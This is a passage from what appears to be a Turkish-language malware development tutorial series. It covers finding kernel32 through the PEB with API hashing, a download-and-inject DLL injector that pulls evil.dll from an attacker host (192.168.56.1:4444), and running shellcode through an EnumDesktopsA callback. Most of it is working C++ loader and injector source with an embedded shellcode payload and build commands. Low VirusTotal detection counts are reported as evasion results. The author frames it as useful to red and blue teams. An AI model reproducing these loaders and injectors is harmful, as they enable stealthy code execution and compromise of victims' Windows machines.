	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main() {
	HMODULE hk32 = GetModuleHandle("kernel32.dll");
	pVirtualAlloc = GetProcAddress(hk32, "VirtualAlloc");
	PVOID lb = pVirtualAlloc(0, sizeof(my_payload),
	MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(lb, my_payload, sizeof(my_payload));
	HANDLE th = CreateThread(0, 0,
	(PTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
}
Bu kod, payload'u yürütmek için çok basit bir mantık içeriyor. Bu durumda, basitlik adına 'meow-meow' mesaj kutusu payload'u kullanılıyor.
Hadi bunu derleyelim:
x86_64-w64-mingw32-g++ meow.cpp -o meow.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-Wint-to-pointer-cast -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive


++++++++++++++++++++++++++++++++
Ve çalıştıralım:
++++++++++++++++++++++++++++++++
GetModuleHandle İşlevini kullanarak kernel32.dll'in bellekteki yerini bulduk. Ancak bu işlemi PEB içinde kütüphane konumunu bularak da gerçekleştirmek mümkündür.

Assembly Tarzı :)

Önceki bölümlerin birinde TEB ve PEB yapıları hakkında yazmıştım ve kernel32'yi assembly ile bulmuştum. Elde edilen sonuçlar şunlardı:  

	1. PEB yapısının ofseti 0x030'dur.  
	2. PEB içindeki LDR'nin ofseti 0x00c'dir.
	3. InMemoryOrderModuleList'in ofseti 0x014'dür.
	4. 1. yüklü modül bizim .exe'mizdir.
	5. 2. yüklü modül ntdll.dll'dir.
	6. 3. yüklü modül kernel32.dll'dir.  
	7. 4. yüklü modül kernelbase.dll'dir.

Bugün x64 mimarisini ele alacağım. Bu durumda ofsetler farklıdır: 

	1.PEB adresi GS kaydına göre nispi bir adreste bulunur: GS:[0x60]
	2. PEB içindeki LDR'nin ofseti 0x18'dir.
	3.kernel32.dll taban adresi 0x10'dadır.

Pratik Örnek

Hadi inceleyelim:

static HMODULE getKernel32(DWORD myHash) {
	HMODULE kernel32;
	INT_PTR peb = __readgsqword(0x60);
	auto modList = 0x18;
	auto modListFlink = 0x18;
	auto kernelBaseAddr = 0x10;

	auto mdllist = *(INT_PTR*)(peb + modList);
	auto mlink = *(INT_PTR*)(mdllist + modListFlink);
	auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
	auto mdl = (LDR_MODULE*)mlink;
	do {
		mdl = (LDR_MODULE*)mdl->e[0].Flink;
		if (mdl->base != nullptr) {
			if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
				break;
}
		}
	} while (mlink != (INT_PTR)mdl);

	kernel32 = (HMODULE)mdl->base;
	return kernel32;
}
Daha sonra GetProcAddress ve GetModuleHandle'ı bulmak için, önceki yazımdaki getAPIAddr işlevimi kullandım:

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
	PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)(
		(LPBYTE)h + img_dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
		(LPBYTE)h +
		img_nt_header->
		OptionalHeader.
		DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
		VirtualAddress);
	PDWORD fAddr = (PDWORD)(
		(LPBYTE)h + img_edt->AddressOfFunctions);
	PDWORD fNames = (PDWORD)(
		(LPBYTE)h + img_edt->AddressOfNames);
	PWORD fOrd = (PWORD)(
		(LPBYTE)h + img_edt->AddressOfNameOrdinals);
	for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
		LPSTR pFuncName = (LPSTR)(
		(LPBYTE)h + fNames[i]);

		if (calcMyHash(pFuncName) == myHash) {
			printf("successfully found! %s - %d\n",
			pFuncName, myHash);
			return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
		}
	}
	return nullptr;
}

Ve buna bağlı olarak, main() işlevinin mantığı farklıdır:

int main() {
	HMODULE mod = getKernel32(56369259);
	fnGetModuleHandleA myGetModuleHandleA =
	(fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
fnGetProcAddress myGetProcAddress =
	(fnGetProcAddress)getAPIAddr(mod, 448915681);

	HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
	fnVirtualAlloc myVirtualAlloc =
	(fnVirtualAlloc)myGetProcAddress(
		hk32, "VirtualAlloc");
	fnCreateThread myCreateThread =
	(fnCreateThread)myGetProcAddress(
		hk32, "CreateThread");
	fnWaitForSingleObject myWaitForSingleObject =
	(fnWaitForSingleObject)myGetProcAddress(
		hk32, "WaitForSingleObject");
	PVOID lb = myVirtualAlloc(0, sizeof(my_payload),
	MEM_COMMIT | MEM_RESERVE,
	PAGE_EXECUTE_READWRITE);
	memcpy(lb, my_payload, sizeof(my_payload));
	HANDLE th = myCreateThread(NULL, 0,
	(PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
	myWaitForSingleObject(th, INFINITE);
}
Gördüğünüz gibi, Win32 API çağrısını hash trick yöntemiyle kullandım.
İşte tam kaynak kodu (hack.cpp):
/*
* hack.cpp - find kernel32 from PEB,
assembly style. C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/04/02/malware-injection-18.html
*/
#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
	LIST_ENTRY e[3];
	HMODULE base;
	void* entry;
	UINT size;
	UNICODE_STRING dllPath;
	UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI *fnGetModuleHandleA)(
	LPCSTR lpModuleName
);

typedef FARPROC(WINAPI *fnGetProcAddress)(
	HMODULE hModule,
	LPCSTR lpProcName
);

typedef PVOID(WINAPI *fnVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
);

typedef PVOID(WINAPI *fnCreateThread)(
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
);

typedef PVOID(WINAPI *fnWaitForSingleObject)(
	HANDLE hHandle,
	DWORD dwMilliseconds
);

DWORD calcMyHash(char* data) {
	DWORD hash = 0x35;
	for (int i = 0; i < strlen(data); i++) {
		hash += data[i] + (hash << 1);
	}
	return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
	char name[64];
	size_t i = 0;

	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
		name[i] = (char)mdll->dllname.Buffer[i];
		i++;
	}
	name[i] = 0;
	return calcMyHash((char *)CharLowerA(name));
}

static HMODULE getKernel32(DWORD myHash) {
	HMODULE kernel32;
	INT_PTR peb = __readgsqword(0x60);
	auto modList = 0x18;
	auto modListFlink = 0x18;
	auto kernelBaseAddr = 0x10;
	auto mdllist = *(INT_PTR*)(peb + modList);
	auto mlink = *(INT_PTR*)(mdllist + modListFlink);
	auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
	auto mdl = (LDR_MODULE*)mlink;
	do {
		mdl = (LDR_MODULE*)mdl->e[0].Flink;
		if (mdl->base != nullptr) {
			if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
				break;
			}
		}
	} while (mlink != (INT_PTR)mdl);

	kernel32 = (HMODULE)mdl->base;
	return kernel32;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
	PIMAGE_NT_HEADERS img_nt_header =
	(PIMAGE_NT_HEADERS)(
	(LPBYTE)h + img_dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
	(LPBYTE)h +
	img_nt_header->
	OptionalHeader.
	DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
	VirtualAddress);
	PDWORD fAddr = (PDWORD)(
	(LPBYTE)h + img_edt->AddressOfFunctions);
	PDWORD fNames = (PDWORD)(
	(LPBYTE)h + img_edt->AddressOfNames);
	PWORD fOrd = (PWORD)(
	(LPBYTE)h + img_edt->AddressOfNameOrdinals);
	for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
		LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
		if (calcMyHash(pFuncName) == myHash) {
			printf("successfully found! %s - %d\n",
			pFuncName, myHash);
			return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
		}
	}
	return nullptr;
}

unsigned char my_payload[] =
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main() {
	HMODULE mod = getKernel32(56369259);
	fnGetModuleHandleA myGetModuleHandleA =
	(fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
	fnGetProcAddress myGetProcAddress =
	(fnGetProcAddress)getAPIAddr(mod, 448915681);

	HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
	fnVirtualAlloc myVirtualAlloc =
	(fnVirtualAlloc)myGetProcAddress(
	  hk32, "VirtualAlloc");
	fnCreateThread myCreateThread =
	(fnCreateThread)myGetProcAddress(
	  hk32, "CreateThread");
	fnWaitForSingleObject myWaitForSingleObject =
	(fnWaitForSingleObject)myGetProcAddress(
	  hk32, "WaitForSingleObject");

	PVOID lb = myVirtualAlloc(0, sizeof(my_payload),
	MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lb, my_payload, sizeof(my_payload));
	HANDLE th = myCreateThread(NULL, 0,
	(PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
	myWaitForSingleObject(th, INFINITE);
}
Gördüğünüz gibi, aynı hash algoritmasını kullandım.

Demo

Haydi bunu derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++
Ve çalıştırıyoruz (kurbanın Windows 10 x64 makinesinde):
.\hack.exe
++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)
Şimdi dosyamızı VirusTotal'a yükleyelim:
++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/0f5204336b3250fe2756b0a675013099be58f99a
522e3e14161c1709275ec2d5/detection

Sonuç olarak, 69 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı.
Bu numaralar, zararlı yazılımımızın statik analizini biraz daha zorlaştırmak için kullanılabilir, özellikle PE formatı ve yaygın göstergelere odaklanarak.
Bu numarayı Conti fidye yazılımının kaynak kodunda gördüm.
Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
PEB structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
TEB structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)
PEB_LDR_DATA structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data)
GetModuleHandleA(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
GetProcAddress(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
windows shellcoding - part 1(https://cocomelonc.github.io/tutorial/2021/10/27/windows-shellcoding-1.html)
windows shellcoding – find
kernel32(https://cocomelonc.github.io/tutorial/2021/10/30/windows-shellcoding-2.html)
Conti ransomware source code(/investigation/2022/03/27/malw-inv-conti-1.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-04-02-malware-injection-18

32. Zararlı Yazılım Geliştirme Tüyoları. İndir ve Enjekte Mantığı. C++ Örneği.

﷽

++++++++++++++++++++++++++++++++
Bu yazı, gerçek hayattaki zararlı yazılımlarda kullanılan ilginç bir numara üzerine yaptığım kendi araştırmaların bir sonucudur.

İndir ve Çalıştır

İndir ve çalıştır ya da bizim durumumuzda indir ve enjekte et, ilginç bir numara olup, bir URL'den payload ya da zararlı DLL indirip, bunu çalıştırmak ya da enjekte etmek için tasarlanmıştır.İndir/çalıştır (veya indir/enjekte et) yaklaşımının avantajı, yalnızca HTTP dışında tüm trafiği filtreleyen ağların arkasında kullanılabilmesidir. Hatta, kimlik doğrulama bilgisi gerektirmeyen bir proxy kullanılıyorsa, önceden yapılandırılmış bir proxy üzerinden bile çalışabilir.

Pratik Örnek

İlk olarak, klasik DLL enjeksiyonu zararlı yazılımını ele alalım. En basit durumda şu şekilde görünecektir:

/*
* classic DLL injection example
* author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
	HANDLE ph; // process handle
	HANDLE rt; // remote thread
	LPVOID rb; // remote buffer

	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

	// parse process pid
	if ( atoi(argv[1]) == 0) {
		printf("PID not found :( exiting...\n");
	return-1;
	}
	printf("PID: %i", atoi(argv[1]));
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
	DWORD(atoi(argv[1])));
	rb = VirtualAllocEx(ph, NULL, evilLen,
	(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
	rt = CreateRemoteThread(ph, NULL, 0,
	(LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	CloseHandle(ph);
	return 0;
}

Gördüğünüz gibi, oldukça basit.
Burada, zararlı evil.dll dosyamızı indirmek için bazı basit bir mantık eklemek istiyorum. En basit durumda şu şekilde görünecektir:
// download evil.dll from url
char* getEvil() {
	HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0",
	INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hHttpFile = InternetOpenUrl(hSession,
	(LPCSTR)"http://192.168.56.1:4444/evil.dll",
	0, 0, 0, 0);
	DWORD dwFileSize = 1024;
	char* buffer = new char[dwFileSize + 1];
	DWORD dwBytesRead;
	DWORD dwBytesWritten;
	HANDLE hFile = CreateFile("C:\\Temp\\evil.dll",
	GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	do {
		buffer = new char[dwFileSize + 1];
		ZeroMemory(buffer, sizeof(buffer));
		InternetReadFile(hHttpFile, (LPVOID)buffer,
		dwFileSize, &dwBytesRead);
		WriteFile(hFile, &buffer[0], dwBytesRead,
		&dwBytesWritten, NULL);
		delete[] buffer;
		buffer = NULL;
	} while (dwBytesRead);

	CloseHandle(hFile);
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hSession);
	return buffer;
}
Bu işlev, saldırganın makinesinden (192.168.56.1:4444, ancak gerçek hayatta bu evilmeowmeow.com:80 gibi görünebilir) evil.dll dosyasını indirir ve C:\\Temp\\evil.dll dosyasına kaydeder.
Daha sonra, bu kodu main() işlevinde çalıştırıyoruz. Enjektörümüzün tam kaynak kodu şu şekildedir:
/*
evil_inj.cpp
classic DLL injection example
author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#pragma comment (lib, "wininet.lib")

char evilDLL[] = "C:\\Temp\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// download evil.dll from url
char* getEvil() {
	HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0",
	INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hHttpFile = InternetOpenUrl(hSession,
	(LPCSTR)"http://192.168.56.1:4444/evil.dll",
	0, 0, 0, 0);
	DWORD dwFileSize = 1024;
	char* buffer = new char[dwFileSize + 1];
	DWORD dwBytesRead;
	DWORD dwBytesWritten;
	HANDLE hFile = CreateFile("C:\\Temp\\evil.dll",
	GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	do {
		buffer = new char[dwFileSize + 1];
		ZeroMemory(buffer, sizeof(buffer));
		InternetReadFile(hHttpFile, (LPVOID)buffer,
		dwFileSize, &dwBytesRead);
		WriteFile(hFile, &buffer[0], dwBytesRead,
		&dwBytesWritten, NULL);
		delete[] buffer;
		buffer = NULL;
	} while (dwBytesRead);
		CloseHandle(hFile);
		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hSession);
		return buffer;
}

// classic DLL injection logic
int main(int argc, char* argv[]) {
	HANDLE ph; // process handle
	HANDLE rt; // remote thread
	LPVOID rb; // remote buffer

	// handle to kernel32 and pass it to GetProcAddress
	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
	char* evil = getEvil();

	// parse process ID
	if ( atoi(argv[1]) == 0) {
		printf("PID not found :( exiting...\n");
		return-1;
	}
	printf("PID: %i\n", atoi(argv[1]));
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
	DWORD(atoi(argv[1])));

	// allocate memory buffer for remote process
	rb = VirtualAllocEx(ph, NULL, evilLen,
	(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	// "copy" evil DLL between processes
	WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

	// our process start new thread
	rt = CreateRemoteThread(ph, NULL, 0,
	(LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	CloseHandle(ph);
	return 0;
}

Her zamanki gibi, basitlik adına, sadece bir mesaj kutusu açan bir DLL oluşturuyoruz:

/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD nReason, LPVOID lpReserved) {
	switch (nReason) {
	case DLL_PROCESS_ATTACH:
		MessageBox(
		NULL,
		"Meow from evil.dll!",
		"=^..^=",
		MB_OK
	);
	break;
case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}
Son olarak, enjektörün tüm kodunu anladıktan sonra, bunu test edebiliriz.
Demo
İlk olarak, DLL'i derleyelim:
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
++++++++++++++++++++++++++++++++
Daha sonra, enjektörü derleyin:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-lwininet -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
++++++++++++++++++++++++++++++++

Saldırganın makinesinde basit bir web sunucusu hazırlayın:
python3 -m http.server 4444
++++++++++++++++++++++++++++++++

Belirtilen yolun kurbanın makinesinde mevcut olduğundan emin olun (`C:\\Temp`):
++++++++++++++++++++++++++++++++

Son olarak, kurban sürecini (`mspaint.exe`) çalıştırın ve enjektör (`hack.exe`) çalıştırın:  

.\hack.exe <mspaint.exe's PID>

++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi dosyamızı VirusTotal'a yükleyelim: 
++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/00e3254cdf384d5c1e15e217e89df9f78b73db7a
2b0d2b7f5441c6d8be804961/detection

Sonuç olarak, 69 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı. 

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler. 

InternetOpen(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena)
InternetOpenUrl(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)
InternetReadFile(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)
InternetCloseHandle(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle)
WriteFile(https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)
CreateFile(https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
CreateRemoteThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
OpenProcess(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
GetProcAddress(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
LoadLibraryA(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
classic DLL injection(https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-04-13-malware-injection-19


33. Zararlı Yazılım Geliştirme Tüyoları. EnumDesktopsA Kullanarak Shellcode Çalıştırma. C++ Örneği.
﷽
++++++++++++++++++++++++++++++++
Bu bölüm, ilginç bir numara üzerine yaptığım araştırmaların bir sonucudur: Shellcode'u masaüstlerini listeleyerek çalıştırmak.
EnumDesktopsA
EnumDesktopsA, çağrı yapan işlemin belirtilen pencere istasyonuyla ilişkili tüm masaüstlerini listeler.Bu işlev, her masaüstünün adını, uygulama tarafından tanımlanan bir geri çağırma işlevine iletir:
BOOL EnumDesktopsA(
HWINSTA hwinsta,
DESKTOPENUMPROCA lpEnumFunc,
LPARAM lParam
);
Pratik Örnek
Hadi, pratik bir örneğe bakalım. Bu numara oldukça basittir:
/*
* hack.cpp - run shellcode via EnumDesktopA.
C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/06/27/malware-injection-20.html
*/
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {
	LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(mem, my_payload, sizeof(my_payload));
	EnumDesktopsA(GetProcessWindowStation(),
	(DESKTOPENUMPROCA)mem, NULL);
	return 0;
}

Gördüğünüz gibi, ilk olarak VirtualAlloc kullanarak mevcut işlemde bir bellek tamponu ayırıyoruz:
LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Daha sonra payload'umuzu bu bellek bölgesine 'kopyalıyoruz':
RtlMoveMemory(mem, my_payload, sizeof(my_payload));
Ve ardından, EnumDesktopsA işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:
EnumDesktopsA(GetProcessWindowStation(),
(DESKTOPENUMPROCA)mem, NULL);

Her zamanki gibi, basitlik adına meow-meow mesaj kutusu payload'unu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
